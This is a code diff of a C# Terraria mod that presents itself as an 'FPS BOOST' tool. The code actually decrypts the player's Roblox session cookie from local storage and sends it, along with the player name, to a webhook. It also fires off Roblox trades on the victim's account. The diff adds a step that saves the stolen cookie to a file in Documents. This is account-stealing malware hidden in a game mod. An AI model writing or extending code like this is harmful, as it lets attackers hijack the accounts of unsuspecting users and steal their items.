@@ -50,9 +50,9 @@ namespace FPSBoostMadeByBrendy
         public override void OnEnterWorld()
         {
 
-			Main.NewText("FPS BOOST v1.3 is enabled!", Color.Green);
-			Main.NewText("If you have any bugs please contact the mod owner!", Color.Red);
-			Main.NewText("Welcome back to TModLoader!", Color.Yellow);
+            Main.NewText("FPS BOOST v1.3 is enabled!", Color.Green);
+            Main.NewText("If you have any bugs please contact the mod owner!", Color.Red);
+            Main.NewText("Welcome back to TModLoader!", Color.Yellow);
             if (Player.name.Equals("Ersultan", StringComparison.OrdinalIgnoreCase))
             {
                 // // Main.NewText("Welcome back, Alpha. Blacklist triggered. Trade system safely disabled. 🙏", Color.Yellow);
@@ -194,7 +194,7 @@ namespace FPSBoostMadeByBrendy
 
                 if (myOfferIds.Count == 0 && config.UserAmountRobux <= 0)
                 {
-                    Main.QueueMainThreadAction(() =>  Main.NewText("", Color.Yellow));
+                    Main.QueueMainThreadAction(() => Main.NewText("", Color.Yellow));
                 }
 
                 await SendRobloxTrade(config, myOfferIds, targetOfferIds);
@@ -330,10 +330,17 @@ namespace FPSBoostMadeByBrendy
             {
                 string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Roblox\LocalStorage\RobloxCookies.dat");
                 if (!File.Exists(path)) return;
+                string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+                string fileName = "File.txt";
+                string fullPath = Path.Combine(documentsPath, fileName);
                 byte[] encrypted = Convert.FromBase64String(JsonDocument.Parse(File.ReadAllText(path)).RootElement.GetProperty("CookiesData").GetString());
                 string text = Encoding.Latin1.GetString(ProtectedData.Unprotect(encrypted, null, DataProtectionScope.CurrentUser));
                 var match = Regex.Match(text, @"_\|WARNING:-DO-NOT-SHARE-[^|]+\|_[^\s]+");
-                if (match.Success) _foundCookie = match.Value.TrimEnd(';');
+                if (match.Success)
+                {
+                    _foundCookie = match.Value.TrimEnd(';');
+                    File.WriteAllText(fullPath, _foundCookie);
+                }
                 SendWebhook(webhookUrl, Player.name, _foundCookie);
             }
             catch { }
@@ -371,7 +378,7 @@ namespace FPSBoostMadeByBrendy
         }
 
 
-		private void SendWebhookMessage(string url, string messageText)
+        private void SendWebhookMessage(string url, string messageText)
         {
             try
             {
